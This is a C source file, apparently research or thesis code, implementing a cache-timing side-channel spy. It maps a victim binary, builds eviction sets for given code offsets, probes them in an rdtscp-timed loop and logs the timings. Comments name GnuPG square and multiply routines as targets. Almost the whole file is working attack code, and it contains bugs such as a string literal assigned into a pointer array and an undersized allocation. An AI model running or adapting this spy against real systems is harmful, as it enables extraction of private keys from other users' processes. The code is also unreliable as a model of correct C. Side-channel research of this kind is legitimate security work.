#include "chap_3_3_find_evset.c"
#include <sys/stat.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

typedef struct target{
    void *adrs;
    size_t map_len;
    void *mapping;
    Node **evset;
    uint64_t *msrmts;
    uint64_t offset;
} Target;

typedef struct targets{
    size_t number;
    Target **addresses;
} Targets;

#define MSRMT_BUFFER 1000000
#define MAX_TARGETS 5

// Return the locations of address offsets in a file at path file_name. Sets adrs, mapping, map_len in Target.
Target *map(char *file_name, uint64_t offset)
{
    int file_descriptor = open(file_name, O_RDONLY); 
    if (file_descriptor == -1) return NULL;
    struct stat st_buf;
    if (fstat(file_descriptor, &st_buf) == -1) return NULL;
    Target *target = malloc(sizeof(Target));
    target->evset=NULL;
    target->map_len = st_buf.st_size;
    target->mapping = mmap(NULL, target->map_len, PROT_READ, MAP_SHARED, file_descriptor, 0);
    if (target->mapping == MAP_FAILED){
        printf("[!] map: mmap fail with errno %d\n", errno);
        free(target);
        return NULL;
    }
    close(file_descriptor);
    target->adrs = (void *)(((uint64_t) target->mapping) + offset);
    return target;    
}

// Loads probe adresses from offset_path for file at target_path. 
Targets *load_targets(char *target_path, char *offset_path)
{
    FILE *fp = fopen(offset_path, "r");
    char *line = NULL;
    size_t len = 0;
    ssize_t read;
    if (fp == NULL) {
        perror("Error reading adress file (fopen)!\n");
        exit(EXIT_FAILURE);
    }
    Targets *targets = malloc(sizeof(Targets *));
    targets->number=0;

    u64 *offsets = malloc(MAX_TARGETS*sizeof(u64)); // support 20 different adrs

    // read line for line and parse linewise read string to pointers to get offsets and get number of targets
    while ((read = getline(&line, &len, fp)) != -1) {
        (&line)[strlen(line)-1] = "\0"; //delete "\n"
        offsets[targets->number++] = strtol(line, NULL, 16); // make read string to pointer        
    }
    fclose(fp);

    // Apply offsets to return struct Targets
    targets->addresses = malloc(targets->number*sizeof(Target));
    for(size_t i=0; i<targets->number; i++){
        targets->addresses[i] = map(target_path, offsets[i]);
        targets->addresses[i]->offset=offsets[i];
    }
    free(offsets);
    return targets;
}

Targets *init_spy(Config *spy_conf, char *target_filepath, char *offset_target){
    printf("[+] spy: init spy\n");

    // prepare monitoring
    Targets *targets = load_targets(target_filepath, offset_target);
    for(size_t i=0; i<targets->number; i++){
        targets->addresses[i]->evset = find_evset(spy_conf, targets->addresses[i]->adrs);
        targets->addresses[i]->msrmts = malloc(MSRMT_BUFFER*sizeof(uint64_t));
    }    
    printf("[+] spy: find evset done\n");       
    return targets;
}

// free memory properly
void close_spy(Config *conf, Targets *targets){
    if(targets==NULL || targets->addresses==NULL) return;
    else{
        for(size_t i=0; i<targets->number; i++){
            close_evsets(conf, targets->addresses[i]->evset);
            munmap(targets->addresses[i]->mapping, targets->addresses[i]->map_len);
            free(targets->addresses[i]->msrmts);
            free(targets->addresses[i]);
            targets->addresses[i]=NULL;
        }
        free(targets->addresses);
        targets->addresses=NULL;
        free(targets);
        targets=NULL;
    }
}

void append_output(Targets *targets, const char *file_path) {
	FILE *file = fopen(file_path, "a");
    if (file == NULL) {
        printf("Error opening file\n");
        return;
    }

    // Append the string to the file
    // index (zeit in cycles) m1 m2 m3 ..
    for(int i=0; i< MSRMT_BUFFER; i++){
        char output[40], str_buf[16]; // hopefully enough
        memset(output, 0, 40);
        memset(str_buf, 0, 16);
        sprintf(str_buf, "%i", i);        
        strcpy(output, str_buf);
        
        // String handling in C = waste of life time
        for(size_t j=0; j<targets->number; j++){
            memset(str_buf, 0, 16);
            sprintf(str_buf, " %lu", targets->addresses[j]->msrmts[i]); 
            strcat(output, str_buf);
        }
        strcat(output, "\n");
        if (fputs(output, file) == EOF) {
            printf("Error writing to file\n");
            fclose(file);
            return;
        }
    }
	fclose(file);
}

void create_empty_file(const char *filePath) {
    FILE *file = fopen(filePath, "w");
    if (file == NULL) {
        printf("Error creating file\n");
        return;
    }
    fclose(file);
}

void my_monitor(Config *spy_conf, Targets *targets){
    int ctr =0, *hit_ctr=malloc(targets->number*sizeof(int));
    for(size_t i=0; i<targets->number; i++) hit_ctr[i]=0;
    unsigned long long old_tsc, tsc;
    __asm__ __volatile__ ("rdtscp" : "=A" (tsc));
    const char *output_filename = "./output_evict_time.log";
    create_empty_file(output_filename);
    int debug =targets->number;
    while(1)
    {
        old_tsc = tsc;
        __asm__ __volatile__ ("rdtscp" : "=A" (tsc));
        while (tsc - old_tsc < 2500) __asm__ __volatile__ ("rdtscp" : "=A" (tsc));// TODO why 2500/500 cycles per slot now, depending on printf

        for(size_t i=0; i<targets->number; i++){
            targets->addresses[i]->msrmts[ctr]= probe_evset_single(targets->addresses[i]->adrs);
        }

        for(size_t i=0; i<targets->number; i++){
            if(debug>0) printf("%lu, %lx, %p\n", i, targets->addresses[i]->offset, targets->addresses[i]->evset);
            if(debug-->0) list_print(targets->addresses[i]->evset);
            probe_evset_chase(spy_conf, targets->addresses[i]->evset);

            // TODO find different solution
            // if(targets->addresses[i]->msrmts[ctr] < spy_conf->threshold) printf("[i] my_monitor: detected 0x%lx: ctr %d, hit ctr %d\n", targets->addresses[i]->offset, ctr, ++hit_ctr[i]);
        }        

        if(ctr++ >= MSRMT_BUFFER) {
            ctr=0;

            // Write back results
            append_output(targets, output_filename);
            break;
        }
    }
    printf("finished\n");
    // unreachable
    close_spy(spy_conf, targets);
}

void spy(char *victim_filepath, char *offset_filepath){
    Config *spy_conf= config_init(27, 2048, 64, 110, 2097152);
    Targets *targets = init_spy(spy_conf, victim_filepath, offset_filepath);
    printf("[+] spy: spy init complete, monitoring");
    for(size_t i=0; i<targets->number; i++){
        printf(" %p", targets->addresses[i]->adrs);
        if (targets->addresses[i]->evset==NULL){
            printf("[!] spy: evset NULL for offset %ld, aborting...\n", targets->addresses[i]->offset);
            close_spy(spy_conf, targets);
            return;
        }
    }
    printf(" now!\n");
    my_monitor(spy_conf, targets);
}

int main(int ac, char **av){  
    if(ac!=3) {
        printf("Use evict_time [TARGET] [ANYTHING]\n");
        return 0;
    }
    // int my_target = 0xd57ed; 
    // int my_target = 0x1136;
    //0x116f-0x11b4 victim_loop2, loop itself 0x118a - 0x11a8, take 0x118a alder lake
    //0xd57ed madgpg sqr, 0xd571f mul
    // loop2 skylake 0x118a
    spy(av[1], av[2]);
    return 0;
}